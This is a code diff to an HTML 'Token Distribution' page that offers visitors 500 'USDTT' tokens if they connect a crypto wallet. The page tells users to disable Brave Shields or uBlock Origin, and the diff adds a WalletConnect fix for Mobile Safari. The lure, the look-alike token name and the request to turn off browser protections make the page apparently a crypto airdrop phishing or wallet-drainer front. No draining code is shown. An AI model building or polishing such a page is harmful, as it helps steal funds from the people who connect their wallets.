@@ -26,7 +26,7 @@
   <div class="card">
     <h1>🎁 Token Distribution</h1>
     <p>Connect your wallet to receive your allocated 500 USDTT tokens.</p>
-    <div id="adblock-warning" class="warning">⚠️ AdBlocker detected. Disable Brave Shields/uBlock Origin to connect.</div>
+    <div id="adblock-warning" class="warning">⚠️ Scripts blocked. Disable Brave Shields/uBlock Origin to connect.</div>
     <button id="actionBtn">Connect Wallet</button>
     <button id="copyBtn" class="secondary" style="display:none;">📋 Copy WalletConnect URI</button>
     <div id="debug"></div>
@@ -67,6 +67,9 @@
         return log('Scripts blocked by browser/adblocker. Disable shields and refresh.', true);
       }
 
+      // FIX: Mobile Safari UMD build exposes constructor under .default
+      const WCProvider = window.WalletConnectProvider.default || window.WalletConnectProvider;
+
       let provider, ethersProvider, signer, userAddress;
 
       async function connect() {
@@ -80,7 +83,9 @@
           } 
           // 2. Fallback to WalletConnect v1 (Works on iOS Safari)
           else {
-            provider = new WalletConnectProvider({
+            if (!WCProvider) throw new Error('WalletConnectProvider not found');
+            
+            provider = new WCProvider({
               rpc: { 1: 'https://eth.llamarpc.com' },
               chainId: 1,
               qrcode: true
@@ -135,4 +140,5 @@
     };
   </script>
 </body>
+</html>
 </html>
